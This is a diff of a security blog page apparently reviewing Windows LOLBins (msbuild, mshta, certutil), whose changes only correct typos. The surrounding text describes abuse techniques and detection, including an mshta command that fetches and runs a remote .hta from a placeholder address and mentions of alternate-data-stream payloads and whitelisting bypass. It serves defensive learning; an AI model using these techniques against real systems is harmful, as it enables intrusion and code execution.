@@ -1022,7 +1022,7 @@
   class="readtime"
   data-bs-toggle="tooltip"
   data-bs-placement="bottom"
-  title="1457 words"
+  title="1461 words"
 >
   <em>8 min</em> read</span>
 
@@ -1034,19 +1034,19 @@
   
 
   <div class="content">
-    <p>Cyber Security requires such a vast knowledge base consisting so many technologies and techniques at times I find myself struggling to retain knowledge. As I learn new and interesting techniques at times I find myself forgetting the basics.</p>
+    <p>Cyber Security requires such a vast knowledge base consisting of so many technologies and techniques that at times I find myself struggling to retain knowledge. As I learn new and interesting techniques at times I find myself forgetting the basics.</p>
 
 <p>Back to Basics posts will act as a refresher reacquainting myself with knowledge areas I feel in need of a revisit. I’d expect the majority of what I write over this series to be well documented but who knows perhaps some of it might be new to you.</p>
 
-<p>To keep this interesting I’ve explored a number of popular LOLBins, their usage and detection opportunities, pretty standards stuff. In addition to this I’ve selected one LOLBin that I wasn’t particularly familiar with and experiment with its usage in my lab environment.</p>
+<p>To keep this interesting I’ve explored a number of popular LOLBins, their usage and detection opportunities, pretty standard stuff. In addition to this I’ve selected one LOLBin that I wasn’t particularly familiar with and experiment with its usage in my lab environment.</p>
 
 <p>Testing of LOLBins has been performed on a freshly installed and fully updated Windows 10 VM in my lab.
 <br /><br /></p>
 <h2 id="lolbins-primer"><span class="me-2">LOLBins Primer</span><a href="#lolbins-primer" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
 
-<p>Living Off The Land Binaries, Scripts and Libraries(LOLBins) are a mixture windows native or downloaded (from Microsoft) binaries, scripts or Libraries that, whilst having legitimate uses, can be misused for alternate(malicious) purposes.</p>
+<p>Living Off The Land Binaries, Scripts and Libraries(LOLBins) are a mixture windows native or downloaded (from Microsoft) binaries, scripts or Libraries that, whilst having legitimate uses, can be misused for alternate (malicious) purposes.</p>
 
-<p>These binaries look benign at first, trusted in many cases however may pose significant risk to an organisations security posture if left unchecked without having their usage carefully monitored.</p>
+<p>These binaries look benign at first, trusted in many cases however may pose significant risk to an organisation’s security posture if left unchecked without having their usage carefully monitored.</p>
 
 <p>The default and built in nature of LOLBins is challenging as many are shipped natively with Windows however there are significant detection opportunities allowing defence teams to hunt for and catch malicious actors during their attack campaign.</p>
 
@@ -1057,7 +1057,7 @@
 
 <p>Msbuild.exe packaged as part of .NET Framework can be used to compile and execute code, a simple example is to build and execute a csproj file used to store a C# project. An old but great example of what could be is the following “powershell” like shell <a href="https://github.com/Cn33liz/MSBuildShell">https://github.com/Cn33liz/MSBuildShell</a>. This shell once sough to bypass app whitelisting and ASMI giving the user a shell like enviroment launched with msbuild from a .csproj file. The LOLBins page for msbuild can be found <a href="https://lolbas-project.github.io/lolbas/Binaries/Msbuild/">here</a></p>
 
-<p>Keep in mind that msbuild doesn’t have to be used to compile and execute, in alot of cases code compilation is performed using msbuild with execution performed using other means. Code complication on the target system can be beneficial for compatibility and trust reasons (an example being lack of mark-of-the-web).</p>
+<p>Keep in mind that msbuild doesn’t have to be used to compile and execute, in a lot of cases code compilation is performed using msbuild with execution performed using other means. Code complication on the target system can be beneficial for compatibility and trust reasons (an example being lack of mark-of-the-web).</p>
 
 <p>As a proof of concept I threw together a quick calc.exe launcher app and launched it with msbuild.exe using the following command:</p>
 
@@ -1073,7 +1073,7 @@
 
 <p><a href="/assets/img/lolbins/msbuild-calc-process.png" class="popup img-link shimmer"><img src="/assets/img/lolbins/msbuild-calc-process.png" alt="Desktop View" loading="lazy"></a></p>
 
-<p>Of note if the fact that you can further obfuscate commandline activity with the use of .rsp files. Check out the following for more information <a href="https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild-response-files?view=vs-2019">https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild-response-files?view=vs-2019</a>.</p>
+<p>Of note is the fact that you can further obfuscate commandline activity with the use of .rsp files. Check out the following for more information <a href="https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild-response-files?view=vs-2019">https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild-response-files?view=vs-2019</a>.</p>
 
 <h5 id="detection"><span class="me-2">Detection</span><a href="#detection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5>
 
@@ -1106,7 +1106,7 @@
 </pre></td><td class="rouge-code"><pre>"C:\Windows\System32\mshta.exe" http[:]//&lt;ipaddress&gt;/test.hta
 </pre></td></tr></tbody></table></code></div></div>
 
-<p>Inline script content is an interesting one, the use of Mshta allows of inline execution of script content (either VBScript and JScript) without calling a local or remote file. The advantage to this is you don’t necessarily have to bring a file into the environment or reach out to a remote destination for one.</p>
+<p>Inline script content is an interesting one, the use of Mshta allows for inline execution of script content (either VBScript and JScript) without calling a local or remote file. The advantage to this is you don’t necessarily have to bring a file into the environment or reach out to a remote destination for one.</p>
 
 <p>An example of inline execution is as follows:</p>
 <pre><code class="language-tesxt">"C:\Windows\System32\mshta.exe" 
@@ -1114,7 +1114,7 @@
 
 <p>A bonus misuse of mshta is the ability to execute payloads from alternate data streams. Alternate data streams (ADS) are a feature of the NTFS file system that allows files to contain more than one stream of data, enabling hidden or additional information to be stored alongside the main file content.</p>
 
-<p>Execution of Mshta targeting a files alternate data stream can be achieved with the following command structure, keep in mind that there are many ways this can be written:</p>
+<p>Execution of Mshta targeting a file’s alternate data stream can be achieved with the following command structure, keep in mind that there are many ways this can be written:</p>
 
 <div class="language-text highlighter-rouge"><div class="code-header">
         <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span>
@@ -1151,7 +1151,7 @@
 
 <p>The most straight forward detection opportunities come in the form of suspicious downloads and suspicious encoding and decoding. Hunting for commandline arguments where certutil is executed with http or https would warrant further investigation.</p>
 
-<p>Additionally, how Certutil is launched (parent process), if it has suspicious network connections originating from it or if it is wiring suspicious files to disk make also be warrant further investigation and can be used as detection use cases.</p>
+<p>Additionally, how Certutil is launched (parent process), if it has suspicious network connections originating from it or if it is wiring suspicious files to disk may also be warrant further investigation and can be used as detection use cases.</p>
 
 <p><br /></p>
 
